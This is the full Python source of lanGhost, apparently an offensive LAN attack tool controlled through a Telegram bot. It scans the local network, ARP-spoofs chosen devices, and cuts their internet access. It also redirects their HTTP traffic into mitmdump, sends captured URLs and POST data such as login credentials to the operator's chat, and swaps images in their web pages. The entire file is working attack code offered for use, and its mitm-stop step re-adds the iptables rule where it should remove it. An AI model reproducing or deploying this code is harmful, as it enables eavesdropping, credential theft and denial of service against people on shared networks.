#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# lanGhost.py
# author: xdavidhu

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!

from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from netaddr import IPAddress
from scapy.all import send, ARP
from time import sleep
import urllib.request
import urllib.parse
import netifaces
import traceback
import threading
import telegram
import requests
import sqlite3
import base64
import time
import nmap
import json
import os

def refreshNetworkInfo():
    global iface_mac
    global ip_range
    global gw_ip
    global gw_mac
    global ip

    iface_info = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
    iface_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
    netmask = iface_info["netmask"]
    ip = iface_info["addr"]
    ip_range = ip + "/" + str(IPAddress(netmask).netmask_bits())
    gw_ip = False
    for i in netifaces.gateways()[2]:
        if i[1] == interface:
            gw_ip = i[0]
    if not gw_ip:
        print("[!] Cant get gateway IP...")
    else:
        nm = nmap.PortScanner()
        scan = nm.scan(hosts=gw_ip, arguments='-sP')
        hosts = []
        if gw_ip in scan["scan"]:
            if "mac" in scan["scan"][gw_ip]["addresses"]:
                gw_mac = scan["scan"][gw_ip]["addresses"]["mac"]
    if not gw_mac:
        print("[!] Cant get gateway MAC...")

def iptables(action, target=False):
    if action == "setup":
        print("[+] Running iptables setup...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --table nat --flush")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")

    if action == "flush":
        print("[+] Flushing iptables...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --table nat --flush")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")

    if action == "kill":
        print("[+] Dropping connections from " + target + " with iptables...")
        os.system("iptables -I FORWARD -s " + target + " -j DROP")

    if action == "stopkill":
        print("[+] Stopping iptables kill for " + target)
        os.system("iptables -D FORWARD -s " + target + " -j DROP")

    if action == "mitm":
        print("[+] Routing " + target + " into mitmdump with iptables")
        os.system("sudo iptables -t nat -I PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

    if action == "stopmitm":
        print("[+] Stopping iptables mitm for " + target)
        os.system("sudo iptables -t nat -I PREROUTING -s " + target + " -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

def scan():
    refreshNetworkInfo()
    global ip_range
    nm = nmap.PortScanner()
    scan = nm.scan(hosts=ip_range, arguments='-sP')
    hosts = []
    for host in scan["scan"]:
        if "mac" in scan["scan"][host]["addresses"]:
            if "hostnames" in scan["scan"][host] and "name" in scan["scan"][host]["hostnames"][0] and not scan["scan"][host]["hostnames"][0]["name"] == "":
                name = scan["scan"][host]["hostnames"][0]["name"]
                if len(name) > 15:
                    name = name[:15] + "..."
                hosts.append([host, scan["scan"][host]["addresses"]["mac"], name])
            else:
                hosts.append([host, scan["scan"][host]["addresses"]["mac"]])
    return hosts

def resolveMac(mac):
    r = requests.get('https://api.macvendors.com/' + mac)
    vendor = r.text
    if len(vendor) > 15:
        vendor = vendor[:15] + "..."
    return vendor

def subscriptionHandler(bot):
    global admin_chatid
    temp_disconnected = []
    disconnected = []
    reconnected = []
    hosts = False

    def handleDisconnect(host):
        print("[D] Appending " + str([host, 1]) + " to temp_disconnected")
        temp_disconnected.append([host, 1])

    def handleScan(scan):
        for t_host in temp_disconnected:
            if t_host[1] >= 20:
                print("[D] Removed " + str(t_host) + " from temp_disconnected, its over 5")
                disconnected.append(t_host[0])
                temp_disconnected.remove(t_host)

        for t_host in temp_disconnected:
            if not t_host[0] in scan:
                print("[D] Adding +1 to " + str(t_host))
                t_host[1] += 1

    def handleConnect(host):
        for t_host in temp_disconnected:
            if t_host[0] == host:
                print("[D] " + str(t_host) + " reconnected, removing from temp_disconnected")
                reconnected.append(t_host[0])
                temp_disconnected.remove(t_host)

    def getConnected(hosts):
        result = []
        for host in hosts:
            if host not in reconnected:
                result.append(host)
            else:
                reconnected.remove(host)
                print("[D] Not printing " + str(host) + " because its just reconnected")
        return result

    while True:
        print("[+] Scanning for new hosts...")
        new_hosts = scan()
        connected_hosts = []
        disconnected_hosts = []
        if not hosts == False:
            for new_host in new_hosts:
                if not new_host in hosts:
                    handleConnect(new_host)
                    connected_hosts.append(new_host)
            handleScan(hosts)
            for host in hosts:
                if not host in new_hosts:
                    handleDisconnect(host)

        global latest_scan
        latest_scan = new_hosts[:]
        for t_host in temp_disconnected:
            latest_scan.append(t_host[0])

        hosts = new_hosts[:]

        for host in getConnected(connected_hosts):
            print("[+] New device connected: " + resolveMac(host[1]) + " - " + host[0])
            bot.send_message(chat_id=admin_chatid, text="➕📱 New device connected: " + resolveMac(host[1]) + " ➖ " + host[0])
        for host in disconnected:
            print("[+] Device disconnected: " + resolveMac(host[1]) + " - " + host[0])
            bot.send_message(chat_id=admin_chatid, text="➖📱 Device disconnected: " + resolveMac(host[1]) + " ➖ " + host[0])
            disconnected.remove(host)

        time.sleep(20)

def arpSpoof(target, ID, atype):
    global iface_mac
    global gw_ip
    global gw_mac
    while True:
        if attackManager("isrunning", ID=ID) == True:
            send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=iface_mac), count=100, verbose=False)
            time.sleep(1)
        else:
            if atype == "kill":
                iptables("stopkill", target=target[0])
            elif atype == "mitm":
                iptables("stopmitm", target=target[0])
            elif atype == "replaceimg":
                iptables("stopmitm", target=target[0])

                DBconn = sqlite3.connect(script_path + "lanGhost.db")
                DBcursor = DBconn.cursor()
                DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
                DBconn.commit()
                DBconn.close()

                DBconn = sqlite3.connect(script_path + "lanGhost.db")
                DBcursor = DBconn.cursor()
                DBcursor.execute("DELETE FROM lanGhost_img WHERE attackid=?", [str(ID)])
                DBconn.commit()
                DBconn.close()

            send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=gw_mac), count=100, verbose=False)
            break

def mitmHandler(target, ID, bot):
    global admin_chatid
    global script_path

    while True:
        if attackManager("isrunning", ID=ID) == True:
            try:
                DBconn = sqlite3.connect(script_path + "lanGhost.db")
                DBcursor = DBconn.cursor()
                DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_mitm (id integer primary key autoincrement, source TEXT,host TEXT, url TEXT, method TEXT, data TEXT, time TEXT)")
                DBconn.commit()
                DBcursor.execute("SELECT * FROM lanGhost_mitm")
                data = DBcursor.fetchall()
                DBconn.close()

                DBconn = sqlite3.connect(script_path + "lanGhost.db")
                DBcursor = DBconn.cursor()
                textline = "📱 MITM - " + target[0] + "\n\n"
                for item in data:
                    if len(textline) > 3000:
                        break
                    else:
                        if item[4] == "POST":
                            textline += str(item[4]) + " ➖ " + str(item[3]) + "\n📄 POST DATA:\n" + urllib.parse.unquote(item[5]) + "\n\n"
                        else:
                            textline += str(item[4]) + " ➖ " + str(item[3]) + "\n\n"
                    DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=" + str(item[0]))
                    DBconn.commit()
                if not textline == "📱 MITM - " + target[0] + "\n\n":
                    bot.send_message(chat_id=admin_chatid, text=textline)
                DBconn.close()
                time.sleep(1)
            except:
                print("[!!!] mitmHandler crashed...")
        else:
            break


def attackManager(action, attack_type=False, target=False, ID=False):
    global running_attacks
    # Layout: [[ID, attack_type, target, thread]]

    def getNewID():
        if running_attacks == []:
            return 1
        else:
            latest_attack = running_attacks[-1]
            return latest_attack[0] + 1

    if action == "new":
        ID = getNewID()
        running_attacks.append([ID, attack_type, target])
        return ID

    elif action == "del":
        removed = False
        for attack in running_attacks:
            if attack[0] == int(ID):
                removed = True
                running_attacks.remove(attack)
        return removed

    elif action == "isrunning":
        for attack in running_attacks:
            if attack[0] == int(ID):
                return True
        return False

    elif action == "isattacked":
        for attack in running_attacks:
            if attack[2] == target:
                return True
        return False

    elif action == "list":
        return running_attacks


# Command handlers:

def msg_start(bot, update):
    global admin_chatid
    if not str(update.message.chat_id) == str(admin_chatid):
        return

    bot.send_message(chat_id=update.message.chat_id, text="Welcome to lanGhost! 👻")

def msg_ping(bot, update):
    global admin_chatid
    if not str(update.message.chat_id) == str(admin_chatid):
        return

    bot.send_message(chat_id=update.message.chat_id, text="Pong! ⚡️")

def msg_scan(bot, update, args):
    global admin_chatid
    if not str(update.message.chat_id) == str(admin_chatid):
        return

    global latest_scan
    bot.send_message(chat_id=update.message.chat_id, text="Scanning network... 🔎")
    textline = "📱 Devices online:\n\n"
    temp_latest_scan = latest_scan[:]
    temp_latest_scan = sorted(temp_latest_scan, key=lambda x: x[0])
    for host in temp_latest_scan:
        if len(host) > 2:
            textline += host[0] + " ➖ " + resolveMac(host[1]) + " ➖ " + host[2] + "\n"
        else:
            textline += host[0] + " ➖ " + resolveMac(host[1]) + "\n"
    textline = textline[:-1]
    bot.send_message(chat_id=update.message.chat_id, text=textline)

def msg_kill(bot, update, args):
    global admin_chatid
    if not str(update.message.chat_id) == str(admin_chatid):
        return

    if args == []:
        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /kill [IP]")
        return

    target_ip = args[0]

    if attackManager("isattacked", target=target_ip):
        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
        return

    global latest_scan
    hosts = latest_scan[:]
    target_mac = False
    for host in hosts:
        if host[0] == target_ip:
            target_mac = host[1]
    if not target_mac:
        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
        return

    ID = attackManager("new", attack_type="mitm", target=target_ip)

    target = [target_ip, target_mac]
    iptables("kill", target=target[0])
    kill_thread = threading.Thread(target=arpSpoof, args=[target, ID, "kill"])
    kill_thread.daemon = True
    kill_thread.start()

    bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
    bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
    bot.send_message(chat_id=update.message.chat_id, text="🔥 Killing internet for " + target_ip + "...")

def msg_stop(bot, update, args):
    global admin_chatid
    if not str(update.message.chat_id) == str(admin_chatid):
        return

    if args == []:
        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /stop [ATTACK ID]")
        return

    try:
        ID = int(args[0])
    except:
        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Attack ID must be a number.")
        return

    if not attackManager("del", ID=ID):
        bot.send_message(chat_id=update.message.chat_id, text="⚠️ No attack with ID " + str(ID) + ".")
        return

    bot.send_message(chat_id=update.message.chat_id, text="✅ Attack " + str(ID) + " stopped...")

def msg_attacks(bot, update, args):
    global admin_chatid
    if not str(update.message.chat_id) == str(admin_chatid):
        return

    attacks = attackManager("list")

    if attacks == []:
            bot.send_message(chat_id=update.message.chat_id, text="✅ There are no attacks currently running...")
            return

    textline = ""
    for attack in attacks:
        textline += "ID: " + str(attack[0]) + " ➖ " + attack[1] + " ➖ " + attack[2] + "\n"
    bot.send_message(chat_id=update.message.chat_id, text="🔥 Attacks running:\n\n" + textline)

def msg_mitm(bot, update, args):
    global admin_chatid
    if not str(update.message.chat_id) == str(admin_chatid):
        return

    if args == []:
        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /mitm [IP]")
        return

    target_ip = args[0]

    if attackManager("isattacked", target=target_ip):
        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
        return

    global latest_scan
    hosts = latest_scan[:]
    target_mac = False
    for host in hosts:
        if host[0] == target_ip:
            target_mac = host[1]
    if not target_mac:
        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
        return

    ID = attackManager("new", attack_type="mitm", target=target_ip)

    target = [target_ip, target_mac]
    iptables("mitm", target=target[0])
    arp_thread = threading.Thread(target=arpSpoof, args=[target, ID, "mitm"])
    arp_thread.daemon = True
    arp_thread.start()
    mitm_thread = threading.Thread(target=mitmHandler, args=[target, ID, bot])
    mitm_thread.daemon = True
    mitm_thread.start()

    bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
    bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
    bot.send_message(chat_id=update.message.chat_id, text="🔥 Capturing URL's from " + target_ip + "...")


def msg_img(bot, update):
    global admin_chatid
    if not str(update.message.chat_id) == str(admin_chatid):
        return
    try:
        global script_path
        try:
            DBconn = sqlite3.connect(script_path + "lanGhost.db")
            DBcursor = DBconn.cursor()
            DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
            DBconn.commit()
            DBconn.close()
        except:
            return

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("SELECT * FROM lanGhost_img")
        data = DBcursor.fetchall()
        if not data == []:
            for attack in data:
                if attack[2] == "false":
                    imgID = str(update.message.photo[-1].file_id)
                    imgData = bot.getFile(imgID)
                    request = urllib.request.urlopen(imgData["file_path"])
                    img = request.read()
                    img64 = base64.b64encode(img)

                    target = json.loads(attack[1])
                    ID = attackManager("new", attack_type="replaceimg", target=target[0])

                    DBcursor.execute("UPDATE lanGhost_img SET img=?, attackid=?  WHERE target=?", [img64, str(ID), attack[1]])
                    DBconn.commit()



                    iptables("mitm", target=target[0])
                    arp_thread = threading.Thread(target=arpSpoof, args=[target, ID, "replaceimg"])
                    arp_thread.daemon = True
                    arp_thread.start()

                    bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
                    bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
                    bot.send_message(chat_id=update.message.chat_id, text="🔥 Replacing images for " + target[0] + "...")

                    DBconn.close()
                    break
    except:
        print("[!!!] " + str(traceback.format_exc()))

def msg_replaceimg(bot, update, args):
    global admin_chatid
    if not str(update.message.chat_id) == str(admin_chatid):
        return
    try:
        if args == []:
            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /replaceimg [IP]")
            return

        target_ip = args[0]

        if attackManager("isattacked", target=target_ip):
            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
            return

        global latest_scan
        hosts = latest_scan[:]
        target_mac = False
        for host in hosts:
            if host[0] == target_ip:
                target_mac = host[1]
        if not target_mac:
            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
            return

        target = [target_ip, target_mac]
        target = json.dumps(target)

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
        DBconn.commit()
        DBconn.close()

        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("INSERT INTO lanGhost_img VALUES (?, ?, ?, ?)", ["false", target, "false", target_ip])
        DBconn.commit()
        DBconn.close()

        bot.send_message(chat_id=update.message.chat_id, text="📷 Please send the image you want to replace others with:")
    except:
        print("[!!!] " + str(traceback.format_exc()))

def main():
    global admin_chatid

    updater = Updater(token=telegram_api)
    dispatcher = updater.dispatcher
    bot = updater.bot

    bot.send_message(chat_id=admin_chatid, text="lanGhost started! 👻")

    t = threading.Thread(target=subscriptionHandler, args=[bot])
    t.daemon = True
    t.start()

    start_handler = CommandHandler('start', msg_start)
    dispatcher.add_handler(start_handler)
    ping_handler = CommandHandler('ping', msg_ping)
    dispatcher.add_handler(ping_handler)
    scan_handler = CommandHandler('scan', msg_scan, pass_args=True)
    dispatcher.add_handler(scan_handler)
    kill_handler = CommandHandler('kill', msg_kill, pass_args=True)
    dispatcher.add_handler(kill_handler)
    stop_handler = CommandHandler('stop', msg_stop, pass_args=True)
    dispatcher.add_handler(stop_handler)
    attacks_handler = CommandHandler('attacks', msg_attacks, pass_args=True)
    dispatcher.add_handler(attacks_handler)
    mitm_handler = CommandHandler('mitm', msg_mitm, pass_args=True)
    dispatcher.add_handler(mitm_handler)
    img_handler = MessageHandler(Filters.photo, msg_img)
    dispatcher.add_handler(img_handler)
    replaceimg_handler = CommandHandler('replaceimg', msg_replaceimg, pass_args=True)
    dispatcher.add_handler(replaceimg_handler)

    print("[+] Telegram bot started...")
    while True:
        try:
            updater.start_polling()
        except KeyboardInterrupt:
            print("\n\n[+] Stopping...")
            updater.stop()
            os.system("sudo screen -S lanGhost-mitm -X stuff '^C\n'")
            iptables("flush")
            attacks = attackManager("list")
            if not attacks == []:
                print("[+] Stopping attacks...")
            for attack in attacks:
                attackManager("del", ID=attack[0])
            if not attacks == []:
                time.sleep(5)
            print("[+] lanGhost stopped")
            raise SystemExit
        except:
            print("[!!!] Telegram bot crashed, restating...")

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Please run lanGhost as root!")
        exit()

    script_path = os.path.dirname(os.path.realpath(__file__)) + "/"

    try:
        with open(script_path + "config.cfg") as f:
            config = f.read()
            f.close()
    except Exception:
        print("[!] Config file not found... Please run the 'setup.py' script first.")
        exit()

    try:
        config = json.loads(config)
    except:
        print("[!] Config file damaged... Please run the 'setup.py' script to regenerate the file.")
        exit()

    interface = config.get("interface", False)
    telegram_api = config.get("telegram_api", False)
    admin_chatid = config.get("admin_chatid", False)

    if interface == False or telegram_api == False or admin_chatid == False:
        print("[!] Config file damaged... Please run the 'setup.py' script to regenerate the file.")
        exit()

    GREEN = '\033[1m' + '\033[32m'
    WHITE = '\033[1m' + '\33[97m'
    END = '\033[0m'
    header = """
                    """ + GREEN + """ _            """ + WHITE + """  _____ _               _     .-.
                    """ + GREEN + """| |           """ + WHITE + """ / ____| |             | |   | OO|
                    """ + GREEN + """| | __ _ _ __ """ + WHITE + """| |  __| |__   ___  ___| |_  |   |
                    """ + GREEN + """| |/ _` | '_ \\""" + WHITE + """| | |_ | '_ \ / _ \/ __| __| '^^^'
                    """ + GREEN + """| | (_| | | | """ + WHITE + """| |__| | | | | (_) \__ | |_
                    """ + GREEN + """|_|\__,_|_| |_""" + WHITE + """|\_____|_| |_|\___/|___/\__|
                    """
    try:
        print(header + """          v1.0 """ + WHITE + """by David Schütz (@xdavidhu)    """ + "\n" + END)
    except:
        print(header + """                         v1.0 """ + WHITE + """by @xdavidhu    """ + "\n" + END)

    os.system("rm -r " + script_path + "lanGhost.db > /dev/null 2>&1")
    
    os.system("sudo screen -S lanGhost-mitm -m -d mitmdump -T --host -s " + script_path + "proxy-script.py")
    refreshNetworkInfo()
    iptables("setup")

    running_attacks = []
    latest_scan = []
    main()
